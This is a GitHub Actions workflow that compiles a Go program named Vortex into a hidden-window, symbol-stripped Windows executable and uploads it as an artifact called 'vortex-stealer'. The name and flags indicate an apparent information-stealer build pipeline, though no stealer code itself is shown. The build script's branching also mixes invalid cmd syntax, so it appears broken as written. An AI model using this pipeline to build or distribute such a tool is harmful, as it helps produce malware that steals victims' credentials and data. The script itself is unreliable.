name: Build Vortex
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: windows-latest
    steps:
    - uses: actions/checkout@v4
    
    - name: Setup Go
      uses: actions/setup-go@v4
      with:
        go-version: '1.21'
        
    - name: Build
      run: |
        # Vortex typically has main.go in root or cmd/vortex/
        if exist main.go (
          echo "Building from root..."
          go build -ldflags="-H windowsgui -s -w -extldflags=-static" -o vortex.exe
        ) elseif exist cmd (
          echo "Building from cmd directory..."
          go build -ldflags="-H windowsgui -s -w -extldflags=-static" -o vortex.exe ./cmd/...
        ) else (
          echo "Building entire module..."
          go build -ldflags="-H windowsgui -s -w -extldflags=-static" -o vortex.exe ./...
        )
        
    - name: Verify Build
      run: |
        if exist vortex.exe (
          echo "✅ Build successful!"
          dir vortex.exe
        ) else (
          echo "❌ Build failed - no executable created"
          exit 1
        )
        
    - name: Upload
      uses: actions/upload-artifact@v4
      with:
        name: vortex-stealer
        path: vortex.exe
